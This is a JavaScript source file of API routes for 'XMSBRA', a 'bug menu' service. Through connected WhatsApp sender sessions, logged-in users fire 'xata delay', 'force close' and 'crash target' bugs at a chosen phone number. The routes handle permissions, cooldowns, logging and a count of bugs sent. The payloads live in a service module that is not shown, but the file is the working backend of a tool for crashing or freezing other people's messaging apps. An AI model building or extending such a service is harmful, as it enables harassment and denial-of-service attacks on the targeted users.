// XMSBRA API - Bug Menu Routes
import { Hono } from 'hono';
import { authService } from '../services/auth.js';
import { kvService } from '../services/kv.js';
import { whatsappService } from '../services/whatsapp.js';

const bug = new Hono();

// Middleware to check bug menu permission
const checkBugPermission = async (c, next) => {
  const authHeader = c.req.header('Authorization');
  
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return c.json({ 
      success: false, 
      message: 'Authorization required' 
    }, 401);
  }

  const token = authHeader.substring(7);
  const payload = await authService.verifyJWT(c.env, token);
  
  if (!payload) {
    return c.json({ 
      success: false, 
      message: 'Invalid token' 
    }, 401);
  }

  const session = await kvService.getSession(c.env, payload.sub);
  
  if (!session || !authService.hasPermission(session.user.role, 'bug_menu')) {
    return c.json({ 
      success: false, 
      message: 'Insufficient permissions for bug menu' 
    }, 403);
  }

  c.set('user', session.user);
  await next();
};

// Apply permission middleware to all bug routes
bug.use('*', checkBugPermission);

// Xata Force Delay Bug
bug.post('/xata-delay', async (c) => {
  try {
    const { target, sessionId } = await c.req.json();
    const user = c.get('user');
    
    if (!target || !sessionId) {
      return c.json({
        success: false,
        message: 'Target and sessionId are required'
      }, 400);
    }

    // Check cooldown
    const cooldownKey = `xata_delay:${user.id}`;
    const isOnCooldown = await kvService.checkCooldown(c.env, cooldownKey);
    
    if (isOnCooldown) {
      return c.json({
        success: false,
        message: 'Xata delay is on cooldown. Please wait before sending again.'
      }, 429);
    }

    // Validate sender session
    const sender = await kvService.getSender(c.env, sessionId);
    if (!sender || sender.status !== 'connected') {
      return c.json({
        success: false,
        message: 'Sender session not found or not connected'
      }, 400);
    }

    // Send xata delay bug
    const result = await whatsappService.sendXataDelay(c.env, {
      target,
      sessionId,
      sender: sender
    });

    if (result.success) {
      // Set cooldown (30 seconds)
      await kvService.setCooldown(c.env, cooldownKey, {
        startTime: Date.now(),
        duration: 30000, // 30 seconds
        type: 'xata_delay'
      });

      // Log activity
      await kvService.logActivity(c.env, {
        userId: user.id,
        action: 'xata_delay_sent',
        details: `Sent xata delay bug to ${target} using session ${sessionId}`,
        timestamp: new Date().toISOString(),
        ip: c.req.header('CF-Connecting-IP') || 'unknown'
      });

      // Update stats
      await kvService.updateStats(c.env, 'bugsSent');

      return c.json({
        success: true,
        message: 'Xata delay bug sent successfully',
        target,
        sessionId,
        sentAt: new Date().toISOString()
      });
    } else {
      return c.json({
        success: false,
        message: result.error || 'Failed to send xata delay bug'
      }, 500);
    }

  } catch (error) {
    console.error('Xata delay error:', error);
    return c.json({
      success: false,
      message: 'Internal server error'
    }, 500);
  }
});

// Force Close Bug
bug.post('/force-close', async (c) => {
  try {
    const { target, sessionId } = await c.req.json();
    const user = c.get('user');
    
    if (!target || !sessionId) {
      return c.json({
        success: false,
        message: 'Target and sessionId are required'
      }, 400);
    }

    // Check permission for force close
    if (!authService.hasPermission(user.role, 'force_close')) {
      return c.json({
        success: false,
        message: 'Insufficient permissions for force close'
      }, 403);
    }

    // Check cooldown
    const cooldownKey = `force_close:${user.id}`;
    const isOnCooldown = await kvService.checkCooldown(c.env, cooldownKey);
    
    if (isOnCooldown) {
      return c.json({
        success: false,
        message: 'Force close is on cooldown. Please wait before sending again.'
      }, 429);
    }

    // Validate sender session
    const sender = await kvService.getSender(c.env, sessionId);
    if (!sender || sender.status !== 'connected') {
      return c.json({
        success: false,
        message: 'Sender session not found or not connected'
      }, 400);
    }

    // Send force close bug
    const result = await whatsappService.sendForceClose(c.env, {
      target,
      sessionId,
      sender: sender
    });

    if (result.success) {
      // Set cooldown (1 minute)
      await kvService.setCooldown(c.env, cooldownKey, {
        startTime: Date.now(),
        duration: 60000, // 1 minute
        type: 'force_close'
      });

      // Log activity
      await kvService.logActivity(c.env, {
        userId: user.id,
        action: 'force_close_sent',
        details: `Sent force close bug to ${target} using session ${sessionId}`,
        timestamp: new Date().toISOString(),
        ip: c.req.header('CF-Connecting-IP') || 'unknown'
      });

      // Update stats
      await kvService.updateStats(c.env, 'bugsSent');

      return c.json({
        success: true,
        message: 'Force close bug sent successfully',
        target,
        sessionId,
        sentAt: new Date().toISOString()
      });
    } else {
      return c.json({
        success: false,
        message: result.error || 'Failed to send force close bug'
      }, 500);
    }

  } catch (error) {
    console.error('Force close error:', error);
    return c.json({
      success: false,
      message: 'Internal server error'
    }, 500);
  }
});

// Crash Target Bug
bug.post('/crash-target', async (c) => {
  try {
    const { target, sessionId } = await c.req.json();
    const user = c.get('user');
    
    if (!target || !sessionId) {
      return c.json({
        success: false,
        message: 'Target and sessionId are required'
      }, 400);
    }

    // Check permission for crash target
    if (!authService.hasPermission(user.role, 'crash_target')) {
      return c.json({
        success: false,
        message: 'Insufficient permissions for crash target'
      }, 403);
    }

    // Check cooldown
    const cooldownKey = `crash_target:${user.id}`;
    const isOnCooldown = await kvService.checkCooldown(c.env, cooldownKey);
    
    if (isOnCooldown) {
      return c.json({
        success: false,
        message: 'Crash target is on cooldown. Please wait before sending again.'
      }, 429);
    }

    // Validate sender session
    const sender = await kvService.getSender(c.env, sessionId);
    if (!sender || sender.status !== 'connected') {
      return c.json({
        success: false,
        message: 'Sender session not found or not connected'
      }, 400);
    }

    // Send crash target bug
    const result = await whatsappService.sendCrashTarget(c.env, {
      target,
      sessionId,
      sender: sender
    });

    if (result.success) {
      // Set cooldown (2 minutes)
      await kvService.setCooldown(c.env, cooldownKey, {
        startTime: Date.now(),
        duration: 120000, // 2 minutes
        type: 'crash_target'
      });

      // Log activity
      await kvService.logActivity(c.env, {
        userId: user.id,
        action: 'crash_target_sent',
        details: `Sent crash target bug to ${target} using session ${sessionId}`,
        timestamp: new Date().toISOString(),
        ip: c.req.header('CF-Connecting-IP') || 'unknown'
      });

      // Update stats
      await kvService.updateStats(c.env, 'bugsSent');

      return c.json({
        success: true,
        message: 'Crash target bug sent successfully',
        target,
        sessionId,
        sentAt: new Date().toISOString()
      });
    } else {
      return c.json({
        success: false,
        message: result.error || 'Failed to send crash target bug'
      }, 500);
    }

  } catch (error) {
    console.error('Crash target error:', error);
    return c.json({
      success: false,
      message: 'Internal server error'
    }, 500);
  }
});

// Get bug menu status and cooldowns
bug.get('/status', async (c) => {
  try {
    const user = c.get('user');
    
    const cooldowns = {
      xataDelay: await kvService.getCooldown(c.env, `xata_delay:${user.id}`),
      forceClose: await kvService.getCooldown(c.env, `force_close:${user.id}`),
      crashTarget: await kvService.getCooldown(c.env, `crash_target:${user.id}`)
    };

    const now = Date.now();
    const status = {
      xataDelay: {
        available: !cooldowns.xataDelay || (now >= (cooldowns.xataDelay.startTime + cooldowns.xataDelay.duration)),
        cooldownRemaining: cooldowns.xataDelay ? Math.max(0, (cooldowns.xataDelay.startTime + cooldowns.xataDelay.duration) - now) : 0
      },
      forceClose: {
        available: !cooldowns.forceClose || (now >= (cooldowns.forceClose.startTime + cooldowns.forceClose.duration)),
        cooldownRemaining: cooldowns.forceClose ? Math.max(0, (cooldowns.forceClose.startTime + cooldowns.forceClose.duration) - now) : 0
      },
      crashTarget: {
        available: !cooldowns.crashTarget || (now >= (cooldowns.crashTarget.startTime + cooldowns.crashTarget.duration)),
        cooldownRemaining: cooldowns.crashTarget ? Math.max(0, (cooldowns.crashTarget.startTime + cooldowns.crashTarget.duration) - now) : 0
      }
    };

    return c.json({
      success: true,
      status,
      permissions: {
        bugMenu: authService.hasPermission(user.role, 'bug_menu'),
        forceClose: authService.hasPermission(user.role, 'force_close'),
        crashTarget: authService.hasPermission(user.role, 'crash_target')
      }
    });

  } catch (error) {
    console.error('Bug status error:', error);
    return c.json({
      success: false,
      message: 'Internal server error'
    }, 500);
  }
});

// Get bug menu history
bug.get('/history', async (c) => {
  try {
    const user = c.get('user');
    const limit = parseInt(c.req.query('limit')) || 50;
    
    // Get activity logs related to bug menu
    const allLogs = await kvService.getActivityLogs(c.env, 1000);
    const bugLogs = allLogs.filter(log => 
      log.userId === user.id && 
      ['xata_delay_sent', 'force_close_sent', 'crash_target_sent'].includes(log.action)
    ).slice(0, limit);

    return c.json({
      success: true,
      history: bugLogs
    });

  } catch (error) {
    console.error('Bug history error:', error);
    return c.json({
      success: false,
      message: 'Internal server error'
    }, 500);
  }
});

// Clear cooldown (Owner only)
bug.post('/clear-cooldown', async (c) => {
  try {
    const user = c.get('user');
    const { type, targetUserId } = await c.req.json();
    
    // Only owner can clear cooldowns
    if (user.role !== 'owner') {
      return c.json({
        success: false,
        message: 'Only owners can clear cooldowns'
      }, 403);
    }

    const userId = targetUserId || user.id;
    const validTypes = ['xata_delay', 'force_close', 'crash_target'];
    
    if (!type || !validTypes.includes(type)) {
      return c.json({
        success: false,
        message: 'Invalid cooldown type'
      }, 400);
    }

    const cooldownKey = `${type}:${userId}`;
    await c.env.XMSBRA_KV.delete(`cooldown:${cooldownKey}`);

    // Log activity
    await kvService.logActivity(c.env, {
      userId: user.id,
      action: 'cooldown_cleared',
      details: `Cleared ${type} cooldown for user ${userId}`,
      timestamp: new Date().toISOString(),
      ip: c.req.header('CF-Connecting-IP') || 'unknown'
    });

    return c.json({
      success: true,
      message: `${type} cooldown cleared successfully`
    });

  } catch (error) {
    console.error('Clear cooldown error:', error);
    return c.json({
      success: false,
      message: 'Internal server error'
    }, 500);
  }
});

export default bug;

